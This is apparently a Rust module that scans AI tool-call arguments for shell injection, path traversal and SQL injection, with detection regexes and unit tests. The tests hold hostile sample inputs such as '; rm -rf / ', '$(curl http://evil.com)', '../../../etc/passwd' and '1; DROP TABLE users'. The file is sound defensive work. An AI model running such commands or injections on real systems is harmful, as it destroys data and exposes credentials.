//! Request argument scanning for injection patterns.
//!
//! Detects shell injection, path traversal, and SQL injection patterns in
//! tool invocation arguments using a single-pass `RegexSet` per category.
//!
//! # Performance
//!
//! All `RegexSet` instances are compiled once at construction time and reused
//! across every request. A `RegexSet` compiles all patterns into a single DFA,
//! so each string is scanned in O(n) regardless of the number of patterns.

use regex::RegexSet;
use serde_json::{Map, Value};

use super::{Finding, FindingLocation, ScanType, Severity};

/// Pre-compiled input pattern scanner.
///
/// Shell injection and path traversal findings are `Severity::High` (→ block
/// by default). SQL injection findings are `Severity::Medium` (→ warn by
/// default) because SQL keywords appear legitimately in many search queries.
pub struct InputScanner {
    shell: RegexSet,
    path: RegexSet,
    sql: RegexSet,
}

// Six shell injection patterns covering the most dangerous injection vectors.
const SHELL_PATTERNS: &[&str] = &[
    r";\s*(?:rm|cat|curl|wget|nc|bash|sh|python|perl|ruby)\s",
    r"\$\(.*\)",                    // $(command substitution)
    r"`[^`]+`",                     // `backtick execution`
    r"\|\s*(?:sh|bash|zsh|fish)\b", // pipe-to-shell
    r"&&\s*(?:rm|curl|wget|nc)\s",  // chained destructive commands
    r">\s*/(?:etc|tmp|dev|proc)/",  // redirect to system paths
];

// Six path traversal patterns covering encoded and raw variants.
const PATH_TRAVERSAL_PATTERNS: &[&str] = &[
    r"\.\./",                            // basic ../
    r"\.\.\%2[fF]",                      // URL-encoded ../
    r"\.\.\%5[cC]",                      // URL-encoded ..\
    r"(?i)/etc/(?:passwd|shadow|hosts)", // sensitive system files
    r"(?i)/proc/self/",                  // proc filesystem
    r"~/.ssh/",                          // SSH key directory
];

// Four SQL injection patterns — deliberately conservative to minimise false positives.
const SQL_PATTERNS: &[&str] = &[
    r"(?i)'\s*(?:OR|AND)\s+\d+\s*=\s*\d+", // tautology: ' OR 1=1
    r"(?i)(?:UNION\s+SELECT|INSERT\s+INTO|DROP\s+TABLE)", // DDL/DML keywords
    r"(?i);\s*(?:DROP|DELETE|UPDATE|INSERT)\s", // stacked query
    r"(?i)--\s*$",                         // comment termination
];

impl InputScanner {
    /// Create a new scanner, compiling all patterns.
    ///
    /// # Panics
    ///
    /// Panics at startup if any pattern string is invalid regex — this is a
    /// programming error caught during development, not a runtime condition.
    pub fn new() -> Self {
        Self {
            shell: RegexSet::new(SHELL_PATTERNS).expect("Shell injection patterns must compile"),
            path: RegexSet::new(PATH_TRAVERSAL_PATTERNS)
                .expect("Path traversal patterns must compile"),
            sql: RegexSet::new(SQL_PATTERNS).expect("SQL injection patterns must compile"),
        }
    }

    /// Scan all string values in a tool's argument map.
    ///
    /// Recursively descends into nested arrays and objects.
    pub fn scan_args(&self, args: &Map<String, Value>) -> Vec<Finding> {
        let mut findings = Vec::new();
        for (key, value) in args {
            self.scan_value_recursive(key, value, &mut findings);
        }
        findings
    }

    fn scan_value_recursive(&self, key: &str, value: &Value, findings: &mut Vec<Finding>) {
        match value {
            Value::String(s) => {
                self.scan_string(key, s, findings);
            }
            Value::Array(arr) => {
                for item in arr {
                    self.scan_value_recursive(key, item, findings);
                }
            }
            Value::Object(map) => {
                for (k, v) in map {
                    self.scan_value_recursive(k, v, findings);
                }
            }
            // Numbers, booleans, and nulls cannot contain injection patterns.
            _ => {}
        }
    }

    fn scan_string(&self, key: &str, value: &str, findings: &mut Vec<Finding>) {
        let fragment = truncate(value, 200);

        // Shell injection — HIGH severity (deterministic, very few false positives).
        if self.shell.is_match(value) {
            findings.push(Finding {
                scan_type: ScanType::ShellInjection,
                severity: Severity::High,
                description: format!("Shell injection pattern in argument '{key}'"),
                matched: fragment.clone(),
                location: FindingLocation::RequestArgs,
            });
        }

        // Path traversal — HIGH severity.
        if self.path.is_match(value) {
            findings.push(Finding {
                scan_type: ScanType::PathTraversal,
                severity: Severity::High,
                description: format!("Path traversal pattern in argument '{key}'"),
                matched: fragment.clone(),
                location: FindingLocation::RequestArgs,
            });
        }

        // SQL injection — MEDIUM severity (SQL keywords appear in legitimate queries).
        if self.sql.is_match(value) {
            findings.push(Finding {
                scan_type: ScanType::SqlInjection,
                severity: Severity::Medium,
                description: format!("SQL injection pattern in argument '{key}'"),
                matched: fragment,
                location: FindingLocation::RequestArgs,
            });
        }
    }
}

impl Default for InputScanner {
    fn default() -> Self {
        Self::new()
    }
}

fn truncate(s: &str, max: usize) -> String {
    if s.len() > max {
        format!("{}...", &s[..max])
    } else {
        s.to_string()
    }
}

// ─── Tests ────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn scanner() -> InputScanner {
        InputScanner::new()
    }

    fn scan(args: Value) -> Vec<Finding> {
        let map = args.as_object().unwrap().clone();
        scanner().scan_args(&map)
    }

    // ── Shell injection ───────────────────────────────────────────────────────

    #[test]
    fn detects_shell_injection_semicolon() {
        let findings = scan(json!({ "cmd": "; rm -rf / " }));
        assert!(
            findings
                .iter()
                .any(|f| f.scan_type == ScanType::ShellInjection)
        );
    }

    #[test]
    fn detects_shell_injection_backtick() {
        let findings = scan(json!({ "cmd": "`whoami`" }));
        assert!(
            findings
                .iter()
                .any(|f| f.scan_type == ScanType::ShellInjection)
        );
    }

    #[test]
    fn detects_command_substitution() {
        let findings = scan(json!({ "arg": "$(curl http://evil.com)" }));
        assert!(
            findings
                .iter()
                .any(|f| f.scan_type == ScanType::ShellInjection)
        );
    }

    #[test]
    fn detects_pipe_to_shell() {
        let findings = scan(json!({ "data": "echo foo | bash" }));
        assert!(
            findings
                .iter()
                .any(|f| f.scan_type == ScanType::ShellInjection)
        );
    }

    #[test]
    fn detects_chained_destructive_command() {
        let findings = scan(json!({ "input": "normal && rm -f log.txt " }));
        assert!(
            findings
                .iter()
                .any(|f| f.scan_type == ScanType::ShellInjection)
        );
    }

    #[test]
    fn detects_redirect_to_system_path() {
        let findings = scan(json!({ "out": "data > /etc/crontab" }));
        assert!(
            findings
                .iter()
                .any(|f| f.scan_type == ScanType::ShellInjection)
        );
    }

    // ── Path traversal ────────────────────────────────────────────────────────

    #[test]
    fn detects_path_traversal_basic() {
        let findings = scan(json!({ "path": "../../../etc/passwd" }));
        assert!(
            findings
                .iter()
                .any(|f| f.scan_type == ScanType::PathTraversal)
        );
    }

    #[test]
    fn detects_url_encoded_traversal() {
        let findings = scan(json!({ "file": "..%2f..%2fetc%2fshadow" }));
        assert!(
            findings
                .iter()
                .any(|f| f.scan_type == ScanType::PathTraversal)
        );
    }

    #[test]
    fn detects_sensitive_system_file() {
        let findings = scan(json!({ "target": "/etc/passwd" }));
        assert!(
            findings
                .iter()
                .any(|f| f.scan_type == ScanType::PathTraversal)
        );
    }

    #[test]
    fn detects_proc_self_access() {
        let findings = scan(json!({ "path": "/proc/self/environ" }));
        assert!(
            findings
                .iter()
                .any(|f| f.scan_type == ScanType::PathTraversal)
        );
    }

    // ── SQL injection ─────────────────────────────────────────────────────────

    #[test]
    fn detects_sql_tautology() {
        let findings = scan(json!({ "q": "' OR 1=1" }));
        assert!(
            findings
                .iter()
                .any(|f| f.scan_type == ScanType::SqlInjection)
        );
    }

    #[test]
    fn detects_stacked_query() {
        let findings = scan(json!({ "id": "1; DROP TABLE users" }));
        assert!(
            findings
                .iter()
                .any(|f| f.scan_type == ScanType::SqlInjection)
        );
    }

    #[test]
    fn detects_union_select() {
        let findings = scan(json!({ "q": "foo UNION SELECT * FROM passwords" }));
        assert!(
            findings
                .iter()
                .any(|f| f.scan_type == ScanType::SqlInjection)
        );
    }

    // ── Clean args ────────────────────────────────────────────────────────────

    #[test]
    fn clean_args_produce_no_findings() {
        let findings = scan(json!({
            "name": "Alice",
            "count": 42,
            "tags": ["rust", "security"],
            "meta": { "active": true }
        }));
        assert!(
            findings.is_empty(),
            "Expected no findings, got: {findings:?}"
        );
    }

    // ── Nested scanning ───────────────────────────────────────────────────────

    #[test]
    fn nested_json_scanned_recursively() {
        let findings = scan(json!({
            "outer": {
                "inner": "; rm -rf / "
            }
        }));
        assert!(
            findings
                .iter()
                .any(|f| f.scan_type == ScanType::ShellInjection)
        );
    }

    #[test]
    fn array_values_scanned_recursively() {
        let findings = scan(json!({
            "commands": ["; rm -rf / ", "normal"]
        }));
        assert!(
            findings
                .iter()
                .any(|f| f.scan_type == ScanType::ShellInjection)
        );
    }

    // ── Severity checks ───────────────────────────────────────────────────────

    #[test]
    fn shell_injection_has_high_severity() {
        let findings = scan(json!({ "cmd": "; rm -rf / " }));
        let f = findings
            .iter()
            .find(|f| f.scan_type == ScanType::ShellInjection)
            .unwrap();
        assert_eq!(f.severity, Severity::High);
    }

    #[test]
    fn sql_injection_has_medium_severity() {
        let findings = scan(json!({ "q": "' OR 1=1" }));
        let f = findings
            .iter()
            .find(|f| f.scan_type == ScanType::SqlInjection)
            .unwrap();
        assert_eq!(f.severity, Severity::Medium);
    }

    #[test]
    fn path_traversal_has_high_severity() {
        let findings = scan(json!({ "path": "../../../etc/passwd" }));
        let f = findings
            .iter()
            .find(|f| f.scan_type == ScanType::PathTraversal)
            .unwrap();
        assert_eq!(f.severity, Severity::High);
    }
}
